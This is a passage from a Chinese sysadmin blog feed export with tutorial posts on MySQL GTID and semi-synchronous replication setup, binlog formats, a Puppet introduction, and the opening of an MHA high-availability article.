**&lt;span id=&quot;gg6&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;注意事项：&lt;/span&gt;
**  使用基于GTID复制时，不需要再关心master_log_file和master_log_pos，替代的是只需要知道master上的GTID，并且配置在从上即可；
记录GTID的有两个全局变量：gtid_executed和gtid_purged

**与GTID复制相关的参数：**

[![gtid](http://www.simlinux.com/wp-content/uploads/2014/08/gtid1.png)](http://www.simlinux.com/wp-content/uploads/2014/08/gtid1.png)

GTID_EXECUTED ：表示已经在该实例上执行过的事务；执行RESET MASTER可以置空该参数；也可以设置GTID_NEXT执行一个空事务来影响GTID_EXECUTED
GTID_NEXT ：是SESSION级别参数，表示下一个事务被执行使用的GTID（show variables like ‘gtid_%’;）
GTID_PURGED ：表示被删除的binlog事务GTID，它是GTID_EXCUTED的子集，MySQL5.6.9，该参数无法被设置
GTID_OWENED ：表示正在执行的事务的GTID以及对应的线程ID

如果设置MASTER_AUTO_POSITION = 1表示主从复制连接使用基于GTID的方式复制

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`CHANGE MASTER TO MASTER_HOST=&apos;192.168.10.216&apos;,MASTER_USER=&apos;rep&apos;,MASTER_PASSWORD=&apos;geekwolf&apos;,MASTER_AUTO_POSITION=1;
`&lt;/pre&gt;

如果在GTID复制模式下想要使用基于文件的复制协议需要MASTER_AUTO_POSITION=0（至少指定其中MASTER_LOG_FILE、MASTER_LOG_POSITION一个）

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`CHANGE MASTER TO MASTER_HOST=&apos;192.168.10.216&apos;,MASTER_USER=&apos;rep&apos;,MASTER_PASSWORD=&apos;geekwolf&apos;,MASTER_LOG_FILE=&apos;mysql-bin.000002&apos;,MASTER_LOG_POS=120,MASTER_AUTO_POSITION=0;
</code></pre><p><strong><span id="gg7" style="font-weight: inherit; font-style: inherit;">参考文档：</span></strong></p>
<p><a href="http://dev.mysql.com/doc/refman/5.6/en/replication-gtids-restrictions.html" target="_blank" rel="external">MYSQL 5.6 GTID-based Replication</a><br><a href="http://www.woqutech.com/?p=1108" target="_blank" rel="external">MYSQL 5.6 GTID模式下手工删除日志导致备库数据丢失</a><br><a href="http://www.mysqlperformanceblog.com/2013/05/09/how-to-create-a-new-or-repair-a-broken-gtid-based-slave-with-percona-xtrabackup/" target="_blank" rel="external">How to create a new (or repair a broken) GTID based slave with Percona XtraBackup</a></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> gitd </tag>
            
            <tag> 主从复制 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[初认识Puppet]]></title>
      <url>/2014/08/20/e5-88-9d-e8-ae-a4-e8-af-86puppet.html</url>
      <content type="html"><![CDATA[<p><strong><span id="pp1" style="font-weight: inherit; font-style: inherit;">自动化运维都有哪些开源软件？</span></strong></p>
<p>初始化：Kickstart、Cobbler、 Rpmbuild/Xen、Kvm、Lxc、Docker/Openstack、Cloudstack、Opennebula、Eucalyplus<br>配置类工具：Chef、Puppet、Func、Cfengine<br>命令和控制类工具: Fabric、Salstack、Ansible、Capistrano、Pssh、Dsh、Expect<br>监控类工具：Cacti、Nagios、Zabbix、Ganglia<br>推荐阅读：<a href="http://hotpu-meeting.b0.upaiyun.com/2014dtcc/post_pdf/liuyu.pdf" target="_blank" rel="external">http://hotpu-meeting.b0.upaiyun.com/2014dtcc/post_pdf/liuyu.pdf</a></p>
<p><strong><span id="pp2" style="font-weight: inherit; font-style: inherit;">什么是Puppet？</span></strong><br>puppet是一种Linux、Unix平台的集中配置管理系统，使用ruby语言，可管理配置文件、用户、cron任务、软件包、系统服务等。puppet把这些系统实体称之为资源，puppet的设计目标是简化对这些资源的管理以及妥善处理资源间的依赖关系</p>
<p><strong><span id="pp3" style="font-weight: inherit; font-style: inherit;">Puppet都有哪些特性？</span></strong></p>
<ul>
<li>可自动化重复任务、快速部署关键性应用及本地或者云端完成主动管理变更和快速扩展架构规模等</li>
<li>遵循GPL协议，基于ruby开发，2.7.0以后使用Apache 2.0 License</li>
<li>对于sa来讲是抽象的，只依赖于ruby与facter</li>
<li>基于C/S架构，配置master和agent</li>
<li>默认agent每30分钟连接到puppet master</li>
<li>能管理多达40多种资源，如：file、user 、group、host、packeage、service、cron、exec、yumrepo等，适合整个软件生命周期的管理</li>
</ul>
<p><strong><span id="pp4" style="font-weight: inherit; font-style: inherit;">puppet的整个生命周期</span></strong><br>供应（provisioning:包安装）—&gt;配置（configuration）—&gt;联动(orchestration)—&gt;报告(reporting)</p>
<p><strong><span id="pp5" style="font-weight: inherit; font-style: inherit;">Puppet适用于哪些场合？</span></strong></p>
<ul>
<li>初始化配置、修复、升级、审计</li>
<li>统一安装、配置管理软件</li>
<li>统一配置系统优化参数</li>
<li>定期检测服务是否运行</li>
<li>快速替换集群时设备的角色</li>
</ul>
<p><strong><span id="pp6" style="font-weight: inherit; font-style: inherit;">Puppet社区版和企业版本功能上有什么差别？</span></strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/cb.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/cb.png" alt="cb"></a></p>
<p>请参考：<a href="http://puppetlabs.com/puppet/enterprise-vs-open-source" target="_blank" rel="external">http://puppetlabs.com/puppet/enterprise-vs-open-source</a></p>
<p><strong><span id="pp7" style="font-weight: inherit; font-style: inherit;">Puppet支持哪些系统？</span></strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/zcos.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/zcos.png" alt="zcos"></a></p>
<p><strong><span id="pp8" style="font-weight: inherit; font-style: inherit;">Puppet架构是怎样的？</span></strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/ppjg.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/ppjg.png" alt="ppjg"></a></p>
<p><strong><span id="pp9" style="font-weight: inherit; font-style: inherit;">Puppet如何工作的？</span></strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/yl.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/yl.png" alt="yl"></a></p>
<p>  所有配置信息为实现其通用性，在master端通常被定义为modules—class—resource（管理和被管理的对象）<br>资源组成类，类封装成模块<br>puppet只定义目标状态，不用关心实现过程；<br>module(class(resource))—&gt;node ‘FQDN’ {class1,class2}—&gt;agent(facter)报告facter给master —&gt;master根据facter信息生成相应的catalog结果—&gt;agent 应用catalog</p>
<p><strong>流程简述如下：</strong></p>
<ol>
<li>客户端puppetd向master发起认证请求。</li>
<li>Puppet Master告诉client是合法的。</li>
<li>客户端puppetd开始调用facter，facter可以探测出主机的一些变量，例如主机名，内存大小，IP地址等。pupppetd 把这些信息通过ssl连接发送到服务器端。</li>
<li>服务器端的puppet Master 检测客户端的主机名，然后找到manifest里面对应的node配置， 并对该部分内容进行解析，解析分为几个阶段，语法检查，如果语法错误就报错。如果语法没错，就继续解析，解析的结果会生成一个中间的“伪代码”(catalog)，然后把伪代码发给客户端。</li>
<li>客户端接收到“伪代码”，并且执行。</li>
<li>客户端在执行时判断有没有file文件，如果有就向Fileserver发起请求。</li>
<li>客户端继续判断有没有配置Report。如果配置，就把执行结果发送给服务器。</li>
<li>服务器端把客户端的执行结果写入日志。并可以发送给报告系统(DashBoard)</li>
</ol>
<p><strong><span id="pp10" style="font-weight: inherit; font-style: inherit;">Puppet组织结构是怎样的？</span></strong></p>
<p>Puppet的目录结构描述如下： |— puppet.conf # 主配置配置文件<br>|— fileserver.conf #文件服务器配置文件<br>|— auth.conf #认证配置文件 (只允许域内认证)<br>|— autosign.conf #自动验证配置文件<br>|— tagmail.conf # 邮件配置文件（将错误信息发送）<br>|— manifests # 文件存储目录(puppet会先读取该目录的.pp文件&lt;site.pp&gt;)<br>|— nodes<br>| | | puppetclient.pp #puppet解析主配置文件所有的模块和节点都在此文件里include<br>| |— site.pp # 定义puppet相关的变量和默认配置<br>| |— modules.pp # 加载class类模块文件（include nginx）<br>|— modules # 定义模块<br>| —nginx # 以nginx为例<br>| |— file<br>| |— manifests<br>| | |— init.pp #类的定义，类名必须与模块名相同<br>| |—– templates # 模块配置目录，可以被模块的manifests引用<br>| | |— nginx.erb #erb模板</p>
<p><strong>学习Puppet去哪里？</strong></p>
<p>Puppet相关文档：<a href="http://docs.puppetlabs.com/" target="_blank" rel="external">http://docs.puppetlabs.com/</a><br>常用模块下载地址： <a href="https://forge.puppetlabs.com/" target="_blank" rel="external">https://forge.puppetlabs.com/</a><br>PuppetDashboard下载地址：<a href="https://downloads.puppetlabs.com/dashboard/" target="_blank" rel="external">https://downloads.puppetlabs.com/dashboard/</a><br>PuppetDashboard帮助文档：<a href="http://docs.puppetlabs.com/dashboard/" target="_blank" rel="external">http://docs.puppetlabs.com/dashboard/</a><br>Puppet中文wiki：<a href="http://puppet.wikidot.com/" target="_blank" rel="external">http://puppet.wikidot.com/</a><br>Puppet中文论坛：<a href="http://www.puppetfans.com/" target="_blank" rel="external">http://www.puppetfans.com/</a><br>Puppet运维自动化文档：<a href="http://pan.baidu.com/s/1c0hBMgg" target="_blank" rel="external">http://pan.baidu.com/s/1c0hBMgg</a><br>Puppet简单安装可以参考：<a href="http://www.chenshake.com/puppet-study-notes/#i-3" target="_blank" rel="external">http://www.chenshake.com/puppet-study-notes/#i-3</a></p>
<blockquote>
<p>参考 南非蜘蛛</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 自动化运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> puppet </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL复制原理与配置]]></title>
      <url>/2014/08/20/mysql-e5-a4-8d-e5-88-b6-e5-8e-9f-e7-90-86-e4-b8-8e-e9-85-8d-e7-bd-ae.html</url>
      <content type="html"><![CDATA[<h5 id="一、Mysql复制基本原理"><a href="#一、Mysql复制基本原理" class="headerlink" title="一、Mysql复制基本原理"></a><strong><span id="r1" style="font-style: inherit;">一、Mysql复制基本原理</span></strong></h5><p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/fzyl.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/fzyl.png" alt="fzyl"></a></p>
<ol>
<li>Mysql主库在事务提交时会将数据变更作为Events记录在Binlog中，Mysql主库的sync_binlog参数(默认值为0<br>可参考<a href="http://dev.mysql.com/doc/refman/5.6/en/replication-options-binary-log.html#sysvar_sync_binlog" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.6/en/replication-options-binary-log.html#sysvar_sync_binlog</a>)控制Binlog日志刷新到磁盘</li>
<li>主库推送Binlog中的事件到从库的Relay Log，之后从库根据Relay Log重做DML操作</li>
<li>Mysql通过3个线程完成主从复制：Binlog Dump线程跑在主库，I/O线程和SQL线程跑在从库；<br>当从库启动复制，首先创建I/O线程连接到主库，主库随后创建Binlog Dump线程读取数据库事件并发给I/O线程，I/O线程获取到事件数据后更新到从库的Relay Log中去，之后从库上的SQL线程读取Relay Log中更新的数据库事件并应用</li>
</ol>
<p><strong>注释：</strong><br>从库上两个重要文件：<code>master.info</code>：记录I/O线程连接主库的一些参数；<code>relay-log.info</code>：记录SQL线程应用Relay Log的一些参数</p>
<p>#####<br><strong><span id="r2" style="font-weight: inherit; font-style: inherit;">二、Mysql复制中Binlog的三种格式</span></strong></p>
<h6 id="三种格式的介绍"><a href="#三种格式的介绍" class="headerlink" title="三种格式的介绍"></a><strong><span id="r3" style="font-weight: inherit; font-style: inherit;">三种格式的介绍</span></strong></h6><p><strong>Statement (statement-based replication:SBR)：</strong>基于SQL语句级别的Binlog，每条修改数据的SQL都会保存在Binlog里面；<br><strong>Row(RBR)：</strong>基于行级别，记录每一行数据的变化，也就是将每行数据的变化都记录到Binlog里面，记录得非常详细，单并不记录原始SQL；在复制过程，并不会因为存储过程或者触发器造成主从数据不一致问题，但记录的binlog大小会比Statement格式大很多,CREATE、DROP、ALTER操作只记录原始SQL，而不会记录每行数据的变化到Binlog；<br><strong>Mixed(MBR):</strong>混合Statement和Row模式，默认是Statement模式记录，某些情况下会切换到Row模式，例如SQL中包含与时间、用户相关的函数等statement无法完成主从复制的操作；<br><strong><span id="r4" style="font-weight: inherit; font-style: inherit;"></span></strong></p>
<h6 id="Binlog格式的优缺点"><a href="#Binlog格式的优缺点" class="headerlink" title="Binlog格式的优缺点"></a><strong><span id="r4" style="font-weight: inherit; font-style: inherit;">Binlog格式的优缺点</span></strong></h6><p><strong>基于Statement复制(Mysql5.5默认格式):</strong><br><strong>优点：</strong><br>Binlog日志量少，节约IO，和减少了主从网络binlog传输量<br>只记录在master上所执行的语句的细节，以及执行语句的上下文信息<br>同时，审计数据库变的更容易</p>
<p><strong>缺点：</strong><br>由于此格式是记录原始执行的SQL，保证能在slave上正确执行必须记录每条语句的上下文信息<br>部分修改数据库时使用的函数可能出现无法复制：sleep()、last_insert_id()、 load_file()、uuid()、user()、found_rows()、sysdate()(除非启动时—sysdate-is-now=true)<br>可能会导致触发器或者存储过程复制导致数据不一致，如调用NOW()函数<br>INSERT…SELECT 可能会产生比RBR更多的行级锁，例如没有order by的insert…select<br>复制需要执行全表扫描(WHERE中没有使用索引)的UPDATE时，需比row请求更多的行级锁<br>对于AUTO_INCREMENT字段的InnoDB引擎表，INSERT会阻塞其他INSERT语句</p>
<p><strong>注：</strong>如果statement不能保证主从正常复制,error日志会有提示：Statement may not be safe to log in statement format</p>
<p><strong>基于Row复制:</strong><br><strong>优点：</strong><br>只记录每一行数据变化的细节，不需要记录上下文信息<br>不会出现某些情况下auto_increment columns,timestamps,.triger、function、procedure无法正常复制的问题<br>新的row格式已经有了优化， CREATE、DROP、ALTER操作只记录原始SQL，而不会记录每行数据的变化到Binlog<br>适用于主从复制要求强一致性的环境</p>
<p><strong>缺点：</strong><br>update、delete、load data local infile等频繁更新或者删除大量行时会产生大量的binlog日志，会有一定的I/O压力，主从同步产生不必要的流量<br>如：UPDATE products set status=‘sold’ where product_id BETWEEN 30000 and 50000;<br>无法很好的进行数据库审计</p>
<h6 id="Binlog基本配置"><a href="#Binlog基本配置" class="headerlink" title="Binlog基本配置"></a><strong><span id="r5" style="font-weight: inherit; font-style: inherit;">Binlog基本配置</span></strong></h6><p>修改配置文件my.cnf</p>
<pre><code>binlog_format=row                               binlog日志格式 
max_binlog_size = 512M                          每个日志文件大小
binlog_cache_size=1M                            二进制日志缓冲大小,uncommitted事务产生的日志写在cache，committed的持久化到磁盘binlog里面，此参数不是全局的，是针对session的
expire_logs_days = 3                            binlog有效期
log-bin=/datas/mysql/logs/mysql-bin             binlog日志目录
relay-log=/datas/mysql/logs/relay-bin           从库中继日志目录
#slave_skip_errors = all
`&lt;/pre&gt;

##### **&lt;span id=&quot;r6&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;三、Mysql常见两种复制方式&lt;/span&gt;**

###### **&lt;span id=&quot;r6&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;&lt;/span&gt;**
**&lt;span id=&quot;r7&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt; 异步复制（Asynchronous Replication）&lt;/span&gt;**

[![ybfz](http://www.simlinux.com/wp-content/uploads/2014/08/ybfz.png)](http://www.simlinux.com/wp-content/uploads/2014/08/ybfz.png)

  主库执行完Commit后，在主库写入Binlog日志后即可成功返回客户端，无需等等Binlog日志传送给从库

**异步复制主从配置：**

主 : 192.168.10.216
从 : 192.168.10.217

**步骤：**主从版本一致—&amp;gt;主库授权复制帐号—&amp;gt;确保开启binlog及主从server_id唯一—&amp;gt;主库只读，记录主binlog名称及偏移量—&amp;gt;拷贝主数据文件到从相应位置—&amp;gt;从库change master to —&amp;gt;slave start—&amp;gt;检查两个yes

**1.主MySQL配置**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt;GRANT REPLICATION SLAVE ON *.* TO &apos;rep&apos;@&apos;192.168.10.217&apos;  IDENTIFIED BY  &apos;geekwolf&apos;;
mysql&amp;gt;FLUSH TABLES WITH READ LOCK;
mysql&amp;gt; SHOW MASTER STATUS;
+------------------+----------+--------------+------------------+-------------------+
| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |
+------------------+----------+--------------+------------------+-------------------+
| mysql-bin.000003 | 120 | | | |
+------------------+----------+--------------+------------------+-------------------+
1 row in set (0.00 sec)
将主库数据文件拷贝到从库对应目录
mysql&amp;gt;UNLOCK TABLES;
`&lt;/pre&gt;

**2.从MySQL配置**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt;CHANGE MASTER TO MASTER_HOST=&apos;192.168.10.216&apos;,MASTER_USER=&apos;rep&apos;,MASTER_PASSWORD=&apos;geekwolf&apos;,MASTER_LOG_FILE=&apos;mysql-bin.000003&apos;,MASTER_LOG_POS=120;
mysql&amp;gt;START  SLAVE;
mysql&amp;gt; SHOW SLAVE STATUS \G;
*************************** 1\. row ***************************
   Slave_IO_State: Waiting for master to send event
  Master_Host: 192.168.10.216
  Master_User: rep
  Master_Port: 3306
Connect_Retry: 1
  Master_Log_File: mysql-bin.000003
  Read_Master_Log_Pos: 120
   Relay_Log_File: relay-bin.000002
Relay_Log_Pos: 283
Relay_Master_Log_File: mysql-bin.000003
 Slave_IO_Running: Yes
Slave_SQL_Running: Yes
  Replicate_Do_DB:
  Replicate_Ignore_DB:
   Replicate_Do_Table:
   Replicate_Ignore_Table:
  Replicate_Wild_Do_Table:
  Replicate_Wild_Ignore_Table:
   Last_Errno: 0
   Last_Error:
 Skip_Counter: 0
  Exec_Master_Log_Pos: 120
  Relay_Log_Space: 450
  Until_Condition: None
   Until_Log_File:
Until_Log_Pos: 0
   Master_SSL_Allowed: No
   Master_SSL_CA_File:
   Master_SSL_CA_Path:
  Master_SSL_Cert:
Master_SSL_Cipher:
   Master_SSL_Key:
Seconds_Behind_Master: 0
Master_SSL_Verify_Server_Cert: No
Last_IO_Errno: 0
Last_IO_Error:
   Last_SQL_Errno: 0
   Last_SQL_Error:
  Replicate_Ignore_Server_Ids:
 Master_Server_Id: 216
  Master_UUID: bd2a4c6b-d954-11e3-8c0a-0200c0a80ad8
 Master_Info_File: /usr/local/mysql/data/master.info
SQL_Delay: 0
  SQL_Remaining_Delay: NULL
  Slave_SQL_Running_State: Slave has read all relay log; waiting for the slave I/O thread to update it
   Master_Retry_Count: 86400
  Master_Bind:
  Last_IO_Error_Timestamp:
 Last_SQL_Error_Timestamp:
   Master_SSL_Crl:
   Master_SSL_Crlpath:
   Retrieved_Gtid_Set:
Executed_Gtid_Set:
Auto_Position: 0
1 row in set (0.00 sec)
`&lt;/pre&gt;

**注:** 异步复制中只要binlog不丢失即可保证数据的完整性；当主宕机，从库未收到binlog时，就会丢失数据（主磁盘正常时可以提取差异binlog在从执行），此时就需要用到半同步复制方式

###### **&lt;span id=&quot;r8&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;半同步复制(Semi-synchroous Replicaion)&lt;/span&gt;**

[![btb](http://www.simlinux.com/wp-content/uploads/2014/08/btb.png)](http://www.simlinux.com/wp-content/uploads/2014/08/btb.png)

  主库每次事务成功提交时并不及时反馈给前端，而是等待其中一个从库也接收到Binlog事务并成功写入Relay Log之后，才返回Commit操作成功给客户端；如此半同步就保证了事务成功提交后，至少有两份日志记录，一份在主库Binlog上，另一份在从库的Relay Log上，从而进一步保证数据完整性；半同步复制很大程度取决于主从网络RTT（往返时延）；以插件形式存在，

**半同步复制主从配置：**

主 : 192.168.10.216
从 : 192.168.10.217

**1.判断是否支持动态增加插件**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; select @@have_dynamic_loading;
+------------------------+
| @@have_dynamic_loading |
+------------------------+
| YES |
+------------------------+
`&lt;/pre&gt;

**2.检查是否存在半同步插件,分别在主从安装**
/usr/local/mysql/lib/mysql/plugin/semisync_master.so
/usr/local/mysql/lib/mysql/plugin/semisync_slave.so

主MySQL上安装semisync_master.so:
mysql&amp;gt;install plugin rpl_semi_sync_master SONAME ‘semisync_master.so’

从MySQL上安装semisync_slave.so:
mysql&amp;gt;install plugin rpl_semi_sync_slave SONAME ‘semisync_slave.so’

安装后通过show plugins;查看安装的插件

**3.分别在主从打开semi-sync(默认关闭)**
主：
修改my.cnf

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`rpl_semi_sync_master_enabled=1
rpl_semi_sync_master_timeout=30000(毫秒)   从库宕机或网络故障导致binlog没有及时传送到从库，此时主库上的事务需要等待的时间；此时间内没恢复，MySQL自动调整复制为异步复制模式
mysql&amp;gt; set global rpl_semi_sync_master_enabled=1; 
Query OK, 0 rows affected (0.00 sec)
mysql&amp;gt; set global rpl_semi_sync_master_timeout=30000;
Query OK, 0 rows affected (0.00 sec)
`&lt;/pre&gt;

**从:**
修改my.cnf

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`rpl_semi_sync_master_enabled=1
mysql&amp;gt; set global rpl_semi_sync_master_enabled=1; 
Query OK, 0 rows affected (0.00 sec)
由于之前配置的复制是异步的，所以需要重启下从库I/O线程(或者直接重启主从stop slave;start slave;)：

mysql&amp;gt; STOP SLAVE  IO_THREAD;
Query OK, 0 rows affected (0.04 sec)
mysql&amp;gt; START SLAVE  IO_THREAD;
Query OK, 0 rows affected (0.00 sec)
`&lt;/pre&gt;

**4.验证**
**主：**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; show status like &apos;%semi_sync%&apos;;
`&lt;/pre&gt;

[![semi](http://www.simlinux.com/wp-content/uploads/2014/08/semi.png)](http://www.simlinux.com/wp-content/uploads/2014/08/semi.png)

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`Rpl_semi_sync_master_clients: 值为2，表示有2个semi-sync的备库
Rpl_semi_sync_master_net_avg_wait_time: 表示事务提交后，等待备库响应的平均时间
Rpl_semi_sync_master_no_times: 表示有几次从半同步切换到异步复制
Rpl_semi_sync_master_status : 值为ON，表示半同步复制处于打开状态
Rpl_semi_sync_master_tx_avg_wait_time ：开启Semi-sync，事务返回需要等待的平均时间
Rpl_semi_sync_master_wait_sessions：当前有几个线程在等备库响应
Rpl_semi_sync_master_yes_tx : 值为1054，表示主库有1054个事务是通过半同步复制到从库
Rpl_semi_sync_master_no_tx  : 值为0，表示当前有0个事务不是通过半同步模式同步到从库的
`&lt;/pre&gt;

**从：**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`检查半同步是否开启
show status like &apos;%semi_sync%&apos;;
`&lt;/pre&gt;

[![semion](http://www.simlinux.com/wp-content/uploads/2014/08/semion.png)](http://www.simlinux.com/wp-content/uploads/2014/08/semion.png)

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`检查复制是否正常
show slave status \G;
`&lt;/pre&gt;

##### **&lt;span id=&quot;r9&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;四、提升主从复制性能的方法&lt;/span&gt;**

**方案1：**多级主从架构，将不同库分开复制到不同从上

[![fzjg](http://www.simlinux.com/wp-content/uploads/2014/08/fzjg.png)](http://www.simlinux.com/wp-content/uploads/2014/08/fzjg.png)

**注意事项：**
M2上打开log-slave-updates配置，保证M1传送的binlog能够被记录在M2的RelayLog和Binlog；M2可以选择BLACKHOLE引擎降低M2的I/O；并且Binlog日志的过滤可以在M2去做
BLACKHOLE引擎的使用测试参考:   [http://jroller.com/dschneller/entry/mysql_replication_using_blackhole_engine](http://jroller.com/dschneller/entry/mysql_replication_using_blackhole_engine)
[http://blog.csdn.net/kylinbl/article/details/8903336](http://blog.csdn.net/kylinbl/article/details/8903336)

**方案2：多线程复制（MySQL5.6+）**
多线程复制是基于库的，允许从库并行更新，若单库压力大，此处的多线程复制没有意义；从库设置slave_parallel_workers=4表示MySQL从库在复制时启动4个SQL线程
MySQL5.6一下版本可以尝试Transfer补丁[http://dinglin.iteye.com/blog/1888640](http://dinglin.iteye.com/blog/1888640)

##### 
**&lt;span id=&quot;r10&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;五、Mysql复制遇到的一些问题&lt;/span&gt;**

**1.指定特定的数据库或者表**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`replicate-do-db  告诉从服务器限制默认数据库(由USE所选择)为db_name的语句的复制，指定多个库时多次使用此参数，一次指定一个库，不能跨数据库更新；需要跨数据库进行更新，使用--replicate-wild-do-table=db_name.%
比如：
如果用--replicate-do-db=sales启动从服务器，并且在主服务器上执行下面的语句，UPDATE语句不会复制：
USE prices; UPDATE sales.january SET amount=amount+1000;

replicate-do-table  只复制某个表 ，支持跨库更新，指定多个表时多次使用此参数，一次指定一个表
replicate-ignore-db告诉从服务器不要复制默认数据库(由USE所选择)为db_name的语句。要想忽略多个数据库，应多次使用该选项，每个数据库使用一次。如果正进行跨数据库更新并且不想复制这些更新，不应使用该选项。应使用--replicate-wild-ignore-table=db_name.%
replicate-ignore-table 告诉从服务器线程不要复制更新指定表的任何语句(即使该语句可能更新其它的表)。要想忽略多个表，应多次使用该选项，每个表使用一次。同--replicate-ignore-db对比，该选项可以跨数据库进行更新

replicate-wild-do-table  告诉从服务器线程限制复制更新的表匹配指定的数据库和表名模式的语句。模式可以包含‘%’和‘_’通配符，与LIKE模式匹配操作符具有相同的含义。要指定多个表，应多次使用该选项，每个表使用一次。该选项可以跨数据库进行更新。请读取该选项后面的注意事项。
例如：--replicate-wild-do-table=foo%.bar%只复制数据库名以foo开始和表名以bar开始的表的更新。

replicate-wild-ignore-table告诉从服务器线程不要复制表匹配给出的通配符模式的语句 

从库增加(同步test库的bench1表，忽略同步mysql库所有表)：
replicate-wild-do-table=test.bench1
replicate-wild-ignore-table=mysql.%
`&lt;/pre&gt;

**2.从库复制出错跳过**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt;SET GLOBAL SQL_SLAVE_SKIP_COUNTER=1;
</code></pre><p><strong>3.log event entry exceeded max_allowed_packet的处理</strong></p>
<p>  适当增加max_allowed_packet大小</p>
<p><strong>4.因主库大量滞后binlog，启动slave时，可能会跑满网卡带宽</strong></p>
<p>  前段时间微博上@zolker遇到这类问题，网友也给了很多解决办法，趁此blog总结下<br>A.级联备库方式，避免主MySQL网卡跑满影响<br>B.脚本的方式每隔几秒(sleep)把io_thread停一会，进行缓解 （这种方法简单、粗暴、有效,但有抖动）<br>C.使用facebook的patch <a href="https://github.com/facebook/mysql-5.6/commit/d3b0c7814090bded6563fee7d46d2ae41ed32a60" target="_blank" rel="external">https://github.com/facebook/mysql-5.6/commit/d3b0c7814090bded6563fee7d46d2ae41ed32a60</a></p>
<p>  以上是本人在学习过程中的笔记，一码一字敲出来的，有错误地方请留言~</p>
<p><strong>参考文档：</strong></p>
<p><a href="http://www.ovaistariq.net/528/statement-based-vs-row-based-replication/" target="_blank" rel="external">http://www.ovaistariq.net/528/statement-based-vs-row-based-replication/</a><br><a href="http://www.orczhou.com/index.php/2011/06/mysql-5-5-semi-sync-replication-setup-config/" target="_blank" rel="external">http://www.orczhou.com/index.php/2011/06/mysql-5-5-semi-sync-replication-setup-config/</a><br><a href="http://www.linuxde.net/2013/09/15194.html" target="_blank" rel="external">http://www.linuxde.net/2013/09/15194.html</a><br><a href="http://dev.mysql.com/doc/refman/5.6/en/replication.html" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.6/en/replication.html</a><br>《深入浅出MySQL》</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[MHA高可用部署及测试]]></title>
      <url>/2014/08/20/mha-e9-ab-98-e5-8f-af-e7-94-a8-e9-83-a8-e7-bd-b2-e5-8f-8a-e6-b5-8b-e8-af-95.html</url>
      <content type="html"><![CDATA[<h5 id="一-MHA特性"><a href="#一-MHA特性" class="headerlink" title="一.MHA特性"></a><span id="t1" style="font-weight: inherit; font-style: inherit;">一.MHA特性</span></h5><p>1.主服务器的自动监控和故障转移<br>MHA监控复制架构的主服务器，一旦检测到主服务器故障，就会自动进行故障转移。即使有些从服务器没有收到最新的relay log，MHA自动从最新的从服务器上识别差异的relay log并把这些日志应用到其他从服务器上，因此所有的从服务器保持一致性了。MHA通常在几秒内完成故障转移，9-12秒可以检测出主服务器故障，7-10秒内关闭故障的主服务器以避免脑裂，几秒中内应用差异的relay log到新的主服务器上，整个过程可以在10-30s内完成。还可以设置优先级指定其中的一台slave作为master的候选人。由于MHA在slaves之间修复一致性，因此可以将任何slave变成新的master，而不会发生一致性的问题，从而导致复制失败。<br>2.交互式主服务器故障转移</p>
<p>  可以只使用MHA的故障转移，而不用于监控主服务器，当主服务器故障时，人工调用MHA来进行故障故障。<br>3.非交互式的主故障转移<br>不监控主服务器，但自动实现故障转移。这种特征适用于已经使用其他软件来监控主服务器状态，比如heartbeat来检测主服务器故障和虚拟IP地址接管，可以使用MHA来实现故障转移和slave服务器晋级为master服务器。<br>4.在线切换主服务器<br>在许多情况下，需要将现有的主服务器迁移到另外一台服务器上。比如主服务器硬件故障，RAID控制卡需要重建，将主服务器移到性能更好的服务器上等等。维护主服务器引起性能下降，导致停机时间至少无法写入数据。另外，阻塞或杀掉当前运行的会话会导致主主之间数据不一致的问题发生。MHA提供快速切换和优雅的阻塞写入，这个切换过程只需要0.5-2s的时间，这段时间内数据是无法写入的。在很多情况下，0.5-2s的阻塞写入是可以接受的。因此切换主服务器不需要计划分配维护时间窗口(呵呵，不需要你在夜黑风高时通宵达旦完成切换主服务器的任务)。</p>
